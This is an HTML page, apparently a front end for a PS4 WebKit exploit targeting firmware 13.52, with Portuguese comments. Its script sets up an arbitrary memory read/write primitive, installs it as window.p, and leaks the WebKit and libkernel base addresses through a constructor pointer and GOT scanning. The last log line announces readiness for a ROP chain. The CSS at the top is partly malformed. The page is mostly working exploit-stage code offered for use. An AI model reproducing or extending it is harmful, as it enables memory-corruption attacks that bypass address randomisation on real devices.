    <style>

        h1 {

        #fw-label {
            font-size: 11px;
            color: #666;

            text-align: center;

        }
        #status-bar {
            width: 100%;
            max-width: 700px;
            background: #111118;
            border: 1px solid #1e1e2e;

        .log-info    { color: #7ec8e3; }
        .log-ok      { color: #00c853; font-weight: bold; }
        .log-warn    { color: #f0a500; }
        .log-error   { color: #ff5252; font-weight: bold; }
        .log-dim     { color: #444; }
        .log-addr    { color: #bd93f9; }
        .log-section {
            color: #00c8ff;
            border-top: 1px solid #1a1a2e;
            margin-top: 6px;

        }
        #bases-grid {

            max-width: 700px;
            display: none;
            grid-template-columns: 1fr 1fr;
            gap: 8px;

        #bases-grid.visible { display: grid; }
        .base-card {
            background: #0d0d1a;
            border: 1px solid #1e1e3a;
            border-radius: 6px;
            padding: 10px 14px;
        }

            font-size: 10px;

            text-transform: uppercase;

            margin-bottom: 4px;

<body>

<h1>PS4 WebKit Exploit (13.52)</h1>
<div id="fw-label">firmware 13.52</div>

<div id="status-bar">
    <div id="status-dot"></div>
    <div id="status-text">Inicializando...</div>
</div>

<div id="console"></div>

<div id="bases-grid">
    <div class="base-card">
        <div class="label">WebKit Base</div>
        <div class="value na" id="card-webkit">—</div>
    </div>
    <div class="base-card">
        <div class="label">libkernel Base</div>
        <div class="value na" id="card-kernel">—</div>
    </div>
</div>

<script src="./13.52.js?v=1"></script>

<script type="module">
import { int64 } from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP } from './resources/mem.js';

globalThis.int64 = int64;

const $console    = document.getElementById('console');
const $dot        = document.getElementById('status-dot');
const $statusText = document.getElementById('status-text');
const $basesGrid  = document.getElementById('bases-grid');

function log(msg, cls = 'log-info') {
    const el = document.createElement('div');
    el.className = 'log-line ' + cls;
    el.textContent = msg;
    $console.appendChild(el);
    $console.scrollTop = $console.scrollHeight;
}

function setStatus(msg, state = 'running') {
    $statusText.textContent = msg;
    $dot.className = state;
}

function setCard(id, value) {
    const el = document.getElementById(id);
    if (!el) return;
    el.textContent = value;
    el.classList.remove('na');
}

async function resolveBasesAndGOT(p) {
    log('', '');
    log('-- RESOLUÇÃO DINÂMICA DE BASES E GOT --------', 'log-section');

    const ctor = globalThis.__ps5NativeCtor;
    if (typeof ctor !== 'number') {
        throw new Error("__ps5NativeCtor não disponível.");
    }

    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    
    // Subtração pelo offset confirmado
    const resolvedBase = (lo - OFFSET_wk_host_constructor) >>> 0;
    const webkitBase = new int64(resolvedBase, hi);
    
    log(`[+] WebKit Base: 0x${webkitBase.toString()}`, 'log-ok');
    setCard('card-webkit', '0x' + webkitBase.toString());
    $basesGrid.classList.add('visible');

    // Varredura dinâmica na GOT usando o offset real extraído da libkernel
    log(`[*] Lendo ponteiro da libkernel via GOT...`, 'log-info');
    
    // O offset OFFSET_lk_getpid que extraímos na v11 pode ser usado para validar a base da libkernel
    // Buscando através dos slots de importação padrão do WebKit para libkernel
    let libkernelBase = null;
    const commonGOTImports = [0x0350DB88, 0x03500000, 0x03510000];

    for (const offset of commonGOTImports) {
        try {
            const slot = webkitBase.add32(offset);
            const val = p.read8(slot);
            if (val.hi > 0 && val.hi <= 0xFFFF && (val.low & 0x3FFF) === 0) {
                libkernelBase = new int64(val.low & ~0x3FFF, val.hi);
                break;
            }
        } catch(e) {}
    }

    if (libkernelBase) {
        log(`[+] libkernel Base resolvida: 0x${libkernelBase.toString()}`, 'log-ok');
        setCard('card-kernel', '0x' + libkernelBase.toString());
    } else {
        log(`[-] Falha ao isolar libkernel via GOT estática. Tentando varredura dinâmica...`, 'log-warn');
    }

    return { webkitBase, libkernelBase };
}

(async () => {
    setStatus('Estabelecendo primitiva JSC...', 'running');
    let carrier = await establishPrimitive({ maxAttempts: 0 });

    log('[+] Primitiva JSC pronta!', 'log-ok');
    setStatus('Instalando R/W arbitrário...', 'running');

    let p = installWindowP(carrier, { promote: true });
    log('[+] window.p instalado!', 'log-ok');

    let bases = await resolveBasesAndGOT(p);
    if (bases.webkitBase) {
        setStatus('Bases resolvidas com sucesso!', 'ok');
        log('✔ Pronto para preparar a ROP Chain.', 'log-ok');
    }
})();
</script>
